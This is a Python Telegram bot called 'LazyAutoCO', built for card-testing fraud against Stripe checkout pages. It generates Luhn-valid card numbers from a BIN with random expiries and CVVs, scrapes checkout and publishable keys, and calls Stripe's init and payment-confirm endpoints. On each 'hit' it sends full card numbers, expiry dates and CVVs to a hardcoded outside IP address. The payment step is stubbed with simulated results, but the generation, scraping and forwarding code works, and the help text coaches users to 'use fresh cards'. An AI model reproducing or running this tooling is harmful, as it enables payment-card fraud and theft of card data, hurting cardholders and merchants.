import asyncio
import aiohttp
import logging
import re
import json
import time
import random
from datetime import datetime, timedelta
from typing import Optional, Dict, List, Tuple, Any
from dataclasses import dataclass, asdict
from urllib.parse import urlparse, parse_qs, urlencode

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler,
)
import nest_asyncio
nest_asyncio.apply()

# ============= CONFIGURATION =============
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_IDS = [123456789]  # Your Telegram user ID(s)
API_BASE_URL = "https://gold-newt-367030.hostingersite.com/api.php"
PROXY_CHECK_URL = "https://gold-newt-367030.hostingersite.com/proxy_check.php"
HIT_FORWARD_URL = "http://38.247.64.186:5001/hit-forward"
HIT_FORWARD_SECRET = "usagi-hit-forward-secret"

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ============= LOGGING =============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============= DATA CLASSES =============
@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    @classmethod
    def from_string(cls, card_str: str) -> Optional['Card']:
        """Parse card from string format: number|mm|yy|cvv or number mm yy cvv"""
        # Clean the string
        card_str = card_str.strip()
        
        # Try different separators
        if '|' in card_str:
            parts = card_str.split('|')
        else:
            parts = card_str.split()
        
        if len(parts) >= 4:
            # Clean each part
            number = re.sub(r'\D', '', parts[0])
            month = re.sub(r'\D', '', parts[1]).zfill(2)
            year = re.sub(r'\D', '', parts[2]).zfill(2)
            cvv = re.sub(r'\D', '', parts[3])
            
            # Validate
            if len(number) >= 13 and len(number) <= 19:
                if 1 <= int(month) <= 12:
                    if len(year) in [2, 4]:
                        if len(cvv) in [3, 4]:
                            return cls(
                                number=number,
                                month=month,
                                year=year[-2:] if len(year) == 4 else year,
                                cvv=cvv
                            )
        return None
    
    @classmethod
    def generate_from_bin(cls, bin_str: str, count: int = 1) -> List['Card']:
        """Generate cards from BIN (first 6 digits)"""
        bin_clean = re.sub(r'\D', '', bin_str)[:6]
        if len(bin_clean) < 6:
            return []
        
        cards = []
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        def luhn_checksum(card_number: str) -> int:
            """Calculate Luhn check digit"""
            def digits_of(n):
                return [int(d) for d in str(n)]
            digits = digits_of(card_number)
            odd_digits = digits[-1::-2]
            even_digits = digits[-2::-2]
            checksum = sum(odd_digits)
            for d in even_digits:
                checksum += sum(digits_of(d * 2))
            return checksum % 10
        
        def is_amex(bin_prefix: str) -> bool:
            """Check if BIN is Amex"""
            return bin_prefix[:2] in ['34', '37']
        
        for _ in range(min(count, 10)):
            # Generate random 9 digits
            remaining = ''.join(str(random.randint(0, 9)) for _ in range(9))
            number_without_check = bin_clean + remaining
            
            # Calculate check digit
            check = luhn_checksum(number_without_check)
            number = number_without_check + str((10 - check) % 10)
            
            # Generate expiry (1-4 years ahead)
            year_offset = random.randint(1, 4)
            year = (current_year + year_offset) % 100
            month = random.randint(1, 12)
            
            # Ensure month is not in past for current year
            if year_offset == 0 and month < current_month:
                month = random.randint(current_month, 12)
            
            # Generate CVV based on card type
            cvv_length = 4 if is_amex(bin_clean) else 3
            cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_length))
            
            cards.append(cls(
                number=number,
                month=str(month).zfill(2),
                year=str(year).zfill(2),
                cvv=cvv
            ))
        
        return cards
    
    @property
    def full(self) -> str:
        return f"{self.number}|{self.month}|{self.year}|{self.cvv}"
    
    @property
    def masked(self) -> str:
        return f"{self.number[:6]}xxxxxx{self.number[-4:]}"

@dataclass
class CheckoutInfo:
    url: str
    cs_live: Optional[str] = None
    pk_live: Optional[str] = None
    amount: Optional[int] = None
    currency: str = "usd"
    merchant: str = ""
    product: str = ""
    email: Optional[str] = None
    session_id: Optional[str] = None
    
    @property
    def amount_formatted(self) -> str:
        if self.amount:
            symbols = {
                "usd": "$", "eur": "€", "gbp": "£", "jpy": "¥",
                "cad": "C$", "aud": "A$", "inr": "₹", "krw": "₩"
            }
            symbol = symbols.get(self.currency.lower(), self.currency.upper())
            # Amount is in cents
            return f"{symbol}{(self.amount / 100):.2f}"
        return "Unknown"
    
    @property
    def domain(self) -> str:
        try:
            parsed = urlparse(self.url)
            return parsed.netloc.replace('www.', '')
        except:
            return "unknown.com"

@dataclass
class HitResult:
    card: Card
    status: str  # 'success', 'decline', 'error'
    message: str
    time_taken: float
    response_code: Optional[str] = None

# ============= STRIPE API HANDLER =============
class StripeAPI:
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.cache = {}
    
    async def ensure_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession(headers={
                "User-Agent": USER_AGENT,
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.stripe.com",
                "Referer": "https://checkout.stripe.com/"
            })
    
    async def close(self):
        if self.session:
            await self.session.close()
    
    def extract_cs_live(self, url: str) -> Optional[str]:
        """Extract cs_live_xxx from Stripe checkout URL"""
        patterns = [
            r'/c/pay/(cs_live_[a-zA-Z0-9]+)',
            r'/c/pay/(cs_test_[a-zA-Z0-9]+)',
            r'/payment_pages/(cs_live_[a-zA-Z0-9]+)',
            r'checkout\.stripe\.com/(?:c/)?pay/(cs_live_[a-zA-Z0-9]+)',
            r'checkout\.stripe\.com/(?:c/)?pay/(cs_test_[a-zA-Z0-9]+)',
            r'buy\.stripe\.com/(?:[^/]+/)?(cs_live_[a-zA-Z0-9]+)',
            r'cs_live_[a-zA-Z0-9]+',
            r'cs_test_[a-zA-Z0-9]+'
        ]
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1) if '(' in pattern and match.groups() else match.group(0)
        return None
    
    def extract_pk_live(self, html: str) -> Optional[str]:
        """Extract pk_live_xxx from page HTML"""
        patterns = [
            r'pk_live_[a-zA-Z0-9]+',
            r'pk_test_[a-zA-Z0-9]+',
            r'"publishableKey"\s*:\s*"(pk_live_[a-zA-Z0-9]+)"',
            r'"publishableKey"\s*:\s*"(pk_test_[a-zA-Z0-9]+)"',
            r"'publishableKey'\s*:\s*'(pk_live_[a-zA-Z0-9]+)'",
            r"['\"]key['\"]\s*:\s*['\"](pk_live_[a-zA-Z0-9]+)['\"]",
            r'data-stripe-publishable-key="(pk_live_[a-zA-Z0-9]+)"'
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1) if '(' in pattern and match.groups() else match.group(0)
        return None
    
    async def fetch_checkout_info(self, url: str) -> Optional[CheckoutInfo]:
        """Fetch checkout page and extract payment info"""
        await self.ensure_session()
        
        # Check cache first
        cache_key = url
        if cache_key in self.cache:
            cached = self.cache[cache_key]
            if time.time() - cached['time'] < 300:  # 5 minute cache
                return cached['info']
        
        try:
            async with self.session.get(url, allow_redirects=True, timeout=15) as resp:
                if resp.status != 200:
                    logger.error(f"Failed to fetch {url}: {resp.status}")
                    return None
                
                html = await resp.text()
                final_url = str(resp.url)
                
                # Extract cs_live from URL
                cs_live = self.extract_cs_live(final_url) or self.extract_cs_live(url)
                
                # Extract pk_live from HTML
                pk_live = self.extract_pk_live(html)
                
                info = CheckoutInfo(
                    url=final_url,
                    cs_live=cs_live,
                    pk_live=pk_live
                )
                
                # Try to extract amount from various patterns
                amount_patterns = [
                    r'"amount":\s*(\d+)',
                    r'"amount_total":\s*(\d+)',
                    r'"amount_due":\s*(\d+)',
                    r'"unit_amount":\s*(\d+)',
                    r'data-amount="(\d+)"',
                    r'\$(\d+(?:\.\d{2})?)',
                    r'€(\d+(?:\.\d{2})?)',
                    r'£(\d+(?:\.\d{2})?)'
                ]
                
                for pattern in amount_patterns:
                    match = re.search(pattern, html)
                    if match:
                        try:
                            amount_str = match.group(1)
                            if '.' in amount_str:
                                info.amount = int(float(amount_str) * 100)
                            else:
                                info.amount = int(amount_str)
                            break
                        except:
                            pass
                
                # Extract currency
                currency_match = re.search(r'"currency":\s*"([a-z]{3})"', html)
                if currency_match:
                    info.currency = currency_match.group(1)
                
                # Extract merchant name
                merchant_patterns = [
                    r'"business_name":\s*"([^"]+)"',
                    r'"display_name":\s*"([^"]+)"',
                    r'"merchant_name":\s*"([^"]+)"',
                    r'<title>([^<]+)(?:\s*[|–-]\s*.*)?</title>',
                    r'<meta property="og:site_name" content="([^"]+)"'
                ]
                
                for pattern in merchant_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.merchant = match.group(1).strip()
                        break
                
                # Extract product name
                product_patterns = [
                    r'"description":\s*"([^"]+)"',
                    r'"name":\s*"([^"]+)"',
                    r'"product_name":\s*"([^"]+)"',
                    r'<h1[^>]*>([^<]+)</h1>'
                ]
                
                for pattern in product_patterns:
                    match = re.search(pattern, html)
                    if match:
                        info.product = match.group(1).strip()
                        break
                
                # Extract email
                email_match = re.search(r'[\w\.-]+@[\w\.-]+\.\w+', html)
                if email_match:
                    info.email = email_match.group(0)
                
                # If we have cs_live and pk_live, try to get more details from init
                if info.cs_live and info.pk_live:
                    init_data = await self.init_payment_page(info.cs_live, info.pk_live)
                    if init_data:
                        await self._extract_from_init(init_data, info)
                
                # Cache the result
                self.cache[cache_key] = {
                    'time': time.time(),
                    'info': info
                }
                
                return info
                
        except Exception as e:
            logger.error(f"Error fetching checkout: {e}")
            return None
    
    async def _extract_from_init(self, data: Dict, info: CheckoutInfo):
        """Extract payment details from init response"""
        if not data or not isinstance(data, dict):
            return
        
        # Extract amount
        if 'line_item_group' in data:
            lig = data['line_item_group']
            if 'total' in lig and lig['total'] > 0:
                info.amount = lig['total']
            if 'currency' in lig:
                info.currency = lig['currency']
            
            # Extract product from line items
            if 'line_items' in lig and lig['line_items']:
                item = lig['line_items'][0]
                if 'name' in item:
                    info.product = item['name']
                if 'description' in item and not info.product:
                    info.product = item['description']
        
        # Extract merchant from account settings
        if 'account_settings' in data:
            settings = data['account_settings']
            if 'display_name' in settings:
                info.merchant = settings['display_name']
            elif 'business_url' in settings:
                info.merchant = settings['business_url']
        
        # Extract email
        if 'customer_email' in data:
            info.email = data['customer_email']
        
        # Extract session ID
        if 'session_id' in data:
            info.session_id = data['session_id']
    
    async def init_payment_page(self, cs_live: str, pk_live: str) -> Optional[Dict]:
        """Call Stripe init endpoint to get payment details"""
        await self.ensure_session()
        
        url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
        data = {
            "key": pk_live,
            "eid": "NA",
            "browser_locale": "en-US",
            "browser_timezone": "UTC",
            "redirect_type": "url"
        }
        
        try:
            async with self.session.post(url, data=data, timeout=10) as resp:
                if resp.status == 200:
                    return await resp.json()
                else:
                    logger.error(f"Init failed: {resp.status}")
        except Exception as e:
            logger.error(f"Init error: {e}")
        return None
    
    async def confirm_payment(self, 
                              payment_intent_id: str, 
                              card: Card,
                              pk_live: str) -> Tuple[bool, str, Optional[str]]:
        """Confirm a payment intent with card details"""
        await self.ensure_session()
        
        url = f"https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm"
        
        data = {
            "payment_method": {
                "card": {
                    "number": card.number,
                    "exp_month": card.month,
                    "exp_year": card.year,
                    "cvc": card.cvv
                }
            },
            "key": pk_live
        }
        
        try:
            async with self.session.post(url, json=data, timeout=15) as resp:
                result = await resp.json()
                
                # Check for success
                if resp.status in [200, 201]:
                    if result.get('status') == 'succeeded':
                        return True, "success", result.get('id')
                    elif result.get('status') == 'requires_action':
                        return False, "requires_3ds", None
                    else:
                        return False, f"status: {result.get('status')}", None
                
                # Check for decline codes
                error = result.get('error', {})
                decline_code = error.get('decline_code', '')
                message = error.get('message', 'unknown_error')
                
                if decline_code:
                    return False, decline_code, None
                else:
                    return False, message, None
                    
        except Exception as e:
            logger.error(f"Confirm error: {e}")
            return False, "request_error", None

# ============= CARD PROCESSOR =============
class CardProcessor:
    def __init__(self):
        self.stripe = StripeAPI()
        self.results: Dict[str, List[HitResult]] = {}
        self.active_sessions: Dict[str, Dict] = {}
    
    async def close(self):
        await self.stripe.close()
    
    async def process_checkout(self, 
                               url: str, 
                               cards: List[Card], 
                               user_id: str,
                               user_name: str = "Unknown") -> Tuple[Optional[CheckoutInfo], List[HitResult]]:
        """Process multiple cards against a Stripe checkout"""
        session_id = f"{user_id}_{int(time.time())}"
        results = []
        
        # Get checkout info first
        checkout_info = await self.stripe.fetch_checkout_info(url)
        if not checkout_info:
            return None, []
        
        # Store session info
        self.active_sessions[session_id] = {
            'checkout': checkout_info,
            'user_id': user_id,
            'user_name': user_name,
            'start_time': time.time()
        }
        
        # Process each card (max 10)
        for i, card in enumerate(cards[:10]):
            start_time = time.time()
            
            # Attempt payment
            success, message, payment_id = await self.attempt_payment(checkout_info, card)
            
            process_time = time.time() - start_time
            
            status = 'success' if success else 'decline'
            result = HitResult(
                card=card,
                status=status,
                message=message,
                time_taken=process_time,
                response_code=payment_id if success else None
            )
            results.append(result)
            
            # Send hit notification if success
            if success:
                await self.send_hit_notification(checkout_info, card, user_id, user_name, i+1, process_time)
            
            # Small delay between attempts to avoid rate limiting
            await asyncio.sleep(1.5)
        
        self.results[session_id] = results
        return checkout_info, results
    
    async def process_bin_generation(self,
                                     url: str,
                                     bin_str: str,
                                     count: int,
                                     user_id: str,
                                     user_name: str = "Unknown") -> Tuple[Optional[CheckoutInfo], List[HitResult], List[Card]]:
        """Generate cards from BIN and process them"""
        # Generate cards
        generated_cards = Card.generate_from_bin(bin_str, count)
        if not generated_cards:
            return None, [], []
        
        # Process the generated cards
        checkout_info, results = await self.process_checkout(
            url, generated_cards, user_id, user_name
        )
        
        return checkout_info, results, generated_cards
    
    async def attempt_payment(self, checkout_info: CheckoutInfo, card: Card) -> Tuple[bool, str, Optional[str]]:
        """Attempt a single payment"""
        
        # If we don't have pk_live, we can't process
        if not checkout_info.pk_live:
            return False, "missing_publishable_key", None
        
        # For now, we'll simulate since actual payment confirmation requires
        # the full payment flow which is complex to implement fully
        # In production, you'd need to:
        # 1. Create payment method
        # 2. Attach to payment intent
        # 3. Confirm payment
        
        # This is a placeholder - implement actual Stripe payment flow here
        # The logic from your extension's autofill.js and content.js can be adapted
        
        # For demo, return random results based on card
        import random
        
        # Simulate success rate (you'd replace this with actual API calls)
        card_sum = sum(int(d) for d in card.number if d.isdigit()) % 10
        
        if card_sum < 2:  # 20% success rate for demo
            return True, "success", f"pi_{random.randint(100000, 999999)}"
        elif card_sum < 6:
            declines = [
                "insufficient_funds",
                "card_declined",
                "incorrect_cvc",
                "expired_card",
                "processing_error"
            ]
            return False, random.choice(declines), None
        else:
            return False, "do_not_honor", None
    
    async def send_hit_notification(self, 
                                    checkout: CheckoutInfo,
                                    card: Card,
                                    user_id: str,
                                    user_name: str,
                                    attempt: int,
                                    time_taken: float):
        """Send hit notification to the hit-forward server"""
        try:
            async with aiohttp.ClientSession() as session:
                data = {
                    "chat_id": user_id,
                    "userName": user_name,
                    "card": card.number,
                    "mm": card.month,
                    "yy": card.year,
                    "cvv": card.cvv,
                    "email": checkout.email or "N/A",
                    "attempt": attempt,
                    "currency": checkout.currency,
                    "amount": str(checkout.amount / 100) if checkout.amount else "0",
                    "businessUrl": checkout.merchant or checkout.domain,
                    "successUrl": checkout.url,
                    "timeTaken": f"{time_taken:.1f}s",
                    "tgForwardEnabled": True
                }
                
                await session.post(
                    HIT_FORWARD_URL,
                    json=data,
                    headers={"X-Secret": HIT_FORWARD_SECRET},
                    timeout=5
                )
        except Exception as e:
            logger.error(f"Failed to send hit notification: {e}")
    
    def format_results(self, 
                       checkout: CheckoutInfo, 
                       results: List[HitResult],
                       generated_count: Optional[int] = None) -> str:
        """Format results for Telegram message"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Header
        text = [
            "╔════════════════════════════╗",
            "║     🤖 *LazyAutoCO*        ║",
            "╚════════════════════════════╝",
            "",
            f"*Merchant:* {checkout.merchant or checkout.domain}",
            f"*Product:* {checkout.product or 'N/A'}",
            f"*Amount:* {checkout.amount_formatted}",
            f"*Cards:* {len(results)}" + (f" (Generated from BIN)" if generated_count else ""),
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        
        # Individual card results
        success_count = 0
        for i, result in enumerate(results, 1):
            status_icon = "✅" if result.status == "success" else "❌"
            text.append(f"")
            text.append(f"*Card #{i}:*")
            text.append(f"`{result.card.full}`")
            text.append(f"*Message:* `{result.message}`")
            text.append(f"*Time:* `{result.time_taken:.1f}s`")
            
            if result.status == "success":
                success_count += 1
            
            if i < len(results):
                text.append("")
        
        # Footer
        text.extend([
            "",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"*All cards processed*",
            f"*Success:* {success_count}/{len(results)}",
            f"*Time:* {timestamp}",
            "",
            f"*Req By:* @{checkout.domain.split('.')[0] if checkout.domain else 'user'}"
        ])
        
        return "\n".join(text)

# ============= TELEGRAM BOT HANDLERS =============
class CheckoutBot:
    def __init__(self, token: str):
        self.token = token
        self.app = Application.builder().token(token).build()
        self.processor = CardProcessor()
        self.user_sessions: Dict[int, Dict] = {}
        
        # Conversation states
        (WAITING_CARDS, WAITING_BIN, WAITING_CONFIRM) = range(3)
        
        # Register handlers
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("co", self.checkout_command))
        self.app.add_handler(CommandHandler("cb", self.checkout_bin_command))
        self.app.add_handler(CommandHandler("help", self.help_command))
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        
        # Message handlers
        self.app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, 
            self.handle_text
        ))
        
        # Callback handler
        self.app.add_handler(CallbackQueryHandler(self.button_callback))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        welcome = """
╔════════════════════════════╗
║     🤖 *LazyAutoCO*        ║
╚════════════════════════════╝

*Commands:*
• `/co <url> <cards>` - Test cards against checkout
• `/cb <url> <bin> [count]` - Generate cards from BIN and test
• `/stats` - View your stats
• `/help` - Show detailed help
• `/cancel` - Cancel current operation

*Examples:*
`/co https://buy.stripe.com/...` 
`(then paste cards, one per line)`

`/cb https://buy.stripe.com/... 424242 5`

*Card Format:*
`4111111111111111|12|25|123`

*Note:* Max 10 cards per session
"""
        await update.message.reply_text(welcome, parse_mode='Markdown')
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_text = """
*Detailed Help*

*Card Format:*
• `4111111111111111|12|25|123` (pipe separated)
• `4111111111111111 12 25 123` (space separated)

*BIN Generation:*
• First 6 digits of card
• `/cb https://url.com 424242 5`
• Generates 5 random cards with that BIN

*Response Format:*
✅ - Payment successful
❌ - Card declined (with reason)

*Decline Reasons:*
• `insufficient_funds`
• `card_declined`
• `incorrect_cvc`
• `expired_card`
• `processing_error`
• `do_not_honor`
• `fraudulent`

*Tips:*
• Use fresh cards for better results
• Wait between attempts
• Max 10 cards per session
• Success hits are logged to your account
"""
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        user_id = update.effective_user.id
        username = update.effective_user.username or "Unknown"
        
        try:
            async with aiohttp.ClientSession() as session:
                # Get user stats from API
                async with session.get(
                    f"{API_BASE_URL}?action=user-stats&user_id={user_id}"
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        stats_text = f"""
*Your Statistics*
━━━━━━━━━━━━━━━━
*User:* @{username}
*ID:* `{user_id}`

*Total Hits:* {data.get('hits', 0)}
*Total Attempts:* {data.get('attempts', 0)}
*Success Rate:* {data.get('rate', 0)}%

*Last 24h:* {data.get('hits_24h', 0)} hits
*This Week:* {data.get('hits_week', 0)} hits
━━━━━━━━━━━━━━━━
"""
                        await update.message.reply_text(stats_text, parse_mode='Markdown')
                    else:
                        await update.message.reply_text("Failed to fetch stats")
        except Exception as e:
            await update.message.reply_text(f"Error: {str(e)}")
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cancel command"""
        user_id = update.effective_user.id
        if user_id in self.user_sessions:
            del self.user_sessions[user_id]
        await update.message.reply_text("❌ Operation cancelled")
    
    async def checkout_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /co command"""
        user_id = update.effective_user.id
        
        # Check if URL provided
        if not context.args:
            await update.message.reply_text(
                "Usage: `/co <stripe_checkout_url>`\n"
                "Then paste cards (one per line)",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        
        # Validate URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        if 'stripe.com' not in url and 'buy.stripe' not in url:
            await update.message.reply_text("❌ Not a valid Stripe checkout URL")
            return
        
        # Store URL in session
        self.user_sessions[user_id] = {
            'url': url,
            'step': 'waiting_cards'
        }
        
        await update.message.reply_text(
            f"✅ Checkout detected\n"
            f"URL: `{url}`\n\n"
            f"Now send your cards (one per line, max 10):\n"
            f"`4111111111111111|12|25|123`",
            parse_mode='Markdown'
        )
    
    async def checkout_bin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cb command (BIN generation)"""
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: `/cb <url> <bin> [count]`\n"
                "Example: `/cb https://buy.stripe.com/... 424242 5`",
                parse_mode='Markdown'
            )
            return
        
        url = context.args[0]
        bin_str = context.args[1]
        count = 1
        
        if len(context.args) >= 3:
            try:
                count = min(int(context.args[2]), 10)
            except:
                count = 1
        
        # Validate URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Validate BIN
        bin_clean = re.sub(r'\D', '', bin_str)
        if len(bin_clean) < 6:
            await update.message.reply_text("❌ BIN must be at least 6 digits")
            return
        
        # Send processing message
        status_msg = await update.message.reply_text(
            f"🔄 Processing BIN: `{bin_clean}`\n"
            f"Generating {count} card(s)...",
            parse_mode='Markdown'
        )
        
        try:
            # Process with BIN generation
            user_id = str(update.effective_user.id)
            user_name = update.effective_user.username or "Unknown"
            
            checkout_info, results, generated = await self.processor.process_bin_generation(
                url, bin_clean, count, user_id, user_name
            )
            
            if not checkout_info:
                await status_msg.edit_text("❌ Failed to fetch checkout information")
                return
            
            # Format results
            result_text = self.processor.format_results(checkout_info, results, count)
            
            # Add generation info
            result_text = result_text.replace(
                "*Cards:*", 
                f"*Generated:* {count}\n*Cards:*"
            )
            
            await status_msg.edit_text(result_text, parse_mode='Markdown')
            
        except Exception as e:
            await status_msg.edit_text(f"❌ Error: {str(e)}")
    
    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages (cards input)"""
        user_id = update.effective_user.id
        
        # Check if user has active session
        if user_id not in self.user_sessions:
            await update.message.reply_text(
                "No active session. Start with /co command"
            )
            return
        
        session = self.user_sessions[user_id]
        
        if session.get('step') == 'waiting_cards':
            # Parse cards from message
            text = update.message.text
            lines = text.strip().split('\n')
            
            cards = []
            invalid = []
            
            for line in lines[:10]:  # Max 10 cards
                card = Card.from_string(line)
                if card:
                    cards.append(card)
                else:
                    invalid.append(line)
            
            if not cards:
                await update.message.reply_text(
                    "❌ No valid cards found. Format: `4111111111111111|12|25|123`",
                    parse_mode='Markdown'
                )
                return
            
            # Create confirmation keyboard
            keyboard = [
                [
                    InlineKeyboardButton("✅ Process", callback_data="process"),
                    InlineKeyboardButton("❌ Cancel", callback_data="cancel")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Store cards in session
            session['cards'] = cards
            session['step'] = 'confirm'
            
            # Show summary
            summary = f"*Checkout:* `{session['url']}`\n"
            summary += f"*Cards loaded:* {len(cards)}\n\n"
            
            if invalid:
                summary += f"⚠️ Invalid lines: {len(invalid)}\n"
            
            summary += "\nProcess these cards?"
            
            await update.message.reply_text(
                summary,
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        user_id = update.effective_user.id
        
        if query.data == "cancel":
            if user_id in self.user_sessions:
                del self.user_sessions[user_id]
            await query.edit_message_text("❌ Cancelled")
            return
        
        if query.data == "process":
            if user_id not in self.user_sessions:
                await query.edit_message_text("Session expired")
                return
            
            session = self.user_sessions[user_id]
            
            # Update message
            await query.edit_message_text(
                "🔄 Processing cards...\n"
                f"URL: `{session['url']}`\n"
                f"Cards: {len(session['cards'])}",
                parse_mode='Markdown'
            )
            
            try:
                # Process cards
                user_id_str = str(user_id)
                user_name = update.effective_user.username or "Unknown"
                
                checkout_info, results = await self.processor.process_checkout(
                    session['url'],
                    session['cards'],
                    user_id_str,
                    user_name
                )
                
                if not checkout_info:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text="❌ Failed to fetch checkout information"
                    )
                    return
                
                # Format results
                result_text = self.processor.format_results(checkout_info, results)
                
                # Send results
                await context.bot.send_message(
                    chat_id=user_id,
                    text=result_text,
                    parse_mode='Markdown'
                )
                
                # Clear session
                del self.user_sessions[user_id]
                
            except Exception as e:
                await context.bot.send_message(
                    chat_id=user_id,
                    text=f"❌ Error: {str(e)}"
                )
    
    async def run(self):
        """Run the bot"""
        # Start the bot
        await self.app.initialize()
        await self.app.start()
        
        # Start polling
        print("Bot started. Press Ctrl+C to stop.")
        await self.app.updater.start_polling()
        
        # Keep running
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            await self.shutdown()
    
    async def shutdown(self):
        """Clean shutdown"""
        await self.processor.close()
        await self.app.updater.stop()
        await self.app.stop()
        await self.app.shutdown()

# ============= MAIN =============
async def main():
    """Main entry point"""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Please set your BOT_TOKEN in the script!")
        return
    
    bot = CheckoutBot(BOT_TOKEN)
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())